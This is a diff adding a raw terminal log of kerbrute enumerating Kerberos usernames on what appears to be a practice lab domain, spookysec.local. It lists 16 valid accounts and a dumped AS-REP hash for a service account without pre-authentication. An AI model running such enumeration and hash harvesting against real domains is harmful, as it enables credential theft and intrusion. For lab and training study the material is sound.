@@ -1,0 +1,32 @@
+command -- kerbrute --dc spookysec.local -d spookysec.local user.txt
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 03/15/21 - Ronnie Flathers @ropnop
+
+2021/03/15 10:53:48 >  Using KDC(s):
+2021/03/15 10:53:48 >  	spookysec.local:88
+
+2021/03/15 10:53:49 >  [+] VALID USERNAME:	 james@spookysec.local
+2021/03/15 10:53:53 >  [+] svc-admin has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:2338f80267457ab3b83164b1190f81ba$a4b95306e91aae19a9e8fdeac49dbde7c06e7a5f5a2ce2b6ef35d4823cf291c8a271bcd6ee46274ba6a9d29e0817b9fad59cada5314170b839a84cf0775170e7b679bc73ee6b62c91a828dae3dfa4ba2d746fbf7ebeecd66ceea2eb87a1e241cf39375844e6c92a5962013eb696f001367b8b2306e60362ee6f859e7691d6aebbfbf0a64e49c49db596dbc58be4cda3faddf42c5d88d8e8e53e22aa7711fa4697cf05967817c5ca3a448c2fb474c37ad741a5add502971804b9e70081ca5a5e8cbcf7e4b0c09bb61980d77679fde27339f780b6e7badadda9f75b31de73b0208311c1b004e64bc0e85d1e17f37f0fd62f769b0dfc178c0e2442235d367ff22e4120a153ae7f9
+2021/03/15 10:53:53 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
+2021/03/15 10:53:58 >  [+] VALID USERNAME:	 James@spookysec.local
+2021/03/15 10:54:00 >  [+] VALID USERNAME:	 robin@spookysec.local
+2021/03/15 10:54:19 >  [+] VALID USERNAME:	 darkstar@spookysec.local
+2021/03/15 10:54:30 >  [+] VALID USERNAME:	 administrator@spookysec.local
+2021/03/15 10:54:53 >  [+] VALID USERNAME:	 backup@spookysec.local
+2021/03/15 10:55:04 >  [+] VALID USERNAME:	 paradox@spookysec.local
+2021/03/15 10:56:13 >  [+] VALID USERNAME:	 JAMES@spookysec.local
+2021/03/15 10:56:36 >  [+] VALID USERNAME:	 Robin@spookysec.local
+2021/03/15 10:58:56 >  [+] VALID USERNAME:	 Administrator@spookysec.local
+2021/03/15 11:03:37 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
+2021/03/15 11:05:11 >  [+] VALID USERNAME:	 Paradox@spookysec.local
+2021/03/15 11:10:22 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
+2021/03/15 11:11:50 >  [+] VALID USERNAME:	 ori@spookysec.local
+2021/03/15 11:14:34 >  [+] VALID USERNAME:	 ROBIN@spookysec.local
+2021/03/15 11:32:33 >  Done! Tested 100000 usernames (16 valid) in 2324.881 seconds
+
